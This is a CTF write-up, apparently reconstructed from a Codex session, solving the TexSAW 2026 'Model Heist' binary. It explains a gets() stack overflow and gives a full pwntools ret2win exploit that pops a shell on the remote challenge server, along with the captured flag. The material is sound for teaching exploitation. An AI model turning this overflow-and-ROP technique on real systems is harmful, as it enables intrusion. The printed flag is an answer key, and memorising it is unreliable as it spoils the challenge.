---
title: "TexSAW 2026: Model Heist"
description: "Reconstructed Codex writeup for Model Heist from TexSAW 2026. Original prompt weight: 169 points."
slug: texsaw-model-heist
date: 2026-03-27 20:05:34.142+0000
categories:
    - Binary Exploitation
tags:
    - codex-archive
    - texsaw-2026
    - model-heist
---

## Challenge

- Competition: [TexSAW 2026](https://ctf.txs3c.com/)
- Challenge: `Model Heist`
- Category: `Binary Exploitation`
- Points: `169`

## Reconstruction Note

This post is reconstructed from the local Codex session log and the challenge artifacts stored in this workspace.

Prompt snapshot: Challenge Model Heist Written by brig Neural networks are like onions - or was that ogres? Flag format: texsaw{flag}


## Solve Path

FLAG:
texsaw{sm@sh_st4ck_2_r3turn_to_4nywh3re_y0u_w4nt}

WRITEUP:
1) Given
   - Files: binary only, ```Downloads/chall` (4)``)
   - Remote: `143.198.163.4:15858`
   - Observations: program prints three menu options, reads input with `gets`, and contains a hidden `drive` path that runs `/bin/sh` if given the right key.

2) Recon
   - `file`: 64-bit ELF, dynamically linked, non-PIE.
   - `checksec`: Partial RELRO, no canary, no PIE, executable stack, RWX segments.
   - `libc info`: local `ldd` resolves to standard glibc on Ubuntu 24.04 under WSL.
   - Key symbols / functions:
     - `deliver` at `0x40126c`
     - `drive` at `0x401211`
     - `gets@plt`
     - `system@plt`
     - `tool` contains a `pop rdi; ret` gadget at `0x4011be`
   - Relevant disassembly facts:
     - `deliver` allocates `0x20` bytes and calls `gets` on `[rbp-0x20]`
     - `drive` compares its first argument against `0x48435344`
     - on success, `drive` calls `system("/bin/sh")`

3) Vulnerability
   - Type: stack buffer overflow / ret2win
   - Root cause: `gets()` writes into a 32-byte stack buffer in `deliver()` with no bounds check.
   - Control primitive: RIP control after `32 + 8 = 40` bytes.
   - Extra detail: a plain ret2win chain needed one extra `ret` gadget for stack alignment before `system()`.

4) Exploit Plan
   - Mitigations & bypass:
     - No PIE: fixed code addresses.
     - No canary: direct overwrite is possible.
     - NX/execstack do not matter because ret2win is simpler.
   - Leaks used: none.
   - Final primitive:
     - overflow 40 bytes
     - `pop rdi; ret` at `0x4011be`
     - load key `0x48435344`
     - alignment `ret` at `0x40101a`
     - jump to `drive` at `0x401211`
     - use spawned shell to `cat flag.txt`

5) Exploit (pwntools)
```python
from pwn import *

HOST, PORT = "143.198.163.4", 15858
BIN = "./chall"

OFFSET = 40
POP_RDI_RET = 0x4011be
RET = 0x40101a
DRIVE = 0x401211
KEY = 0x48435344

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(BIN)

io = start()

payload = flat(
    b"A" * OFFSET,
    POP_RDI_RET,
    KEY,
    RET,
    DRIVE,
)

io.recvuntil(b"Canary Court\n")
io.send(payload + b"\n")
io.recvuntil(b"Success! Secret package delivered.\n")

if args.REMOTE:
    io.send(b"cat flag.txt\n")
    print(io.recvrepeat(2).decode("latin1", "ignore"))
else:
    io.send(b"echo pwned\n")
    print(io.recvrepeat(1).decode("latin1", "ignore"))

io.close()
```

6) Proof
   - Remote run output:
```text
Attempting secret delivery to 3 Dangerous Drive...
Success! Secret package delivered.

__MARK__
/app
flag.txt
texsaw{sm@sh_st4ck_2_r3turn_to_4nywh3re_y0u_w4nt}
__END__
```
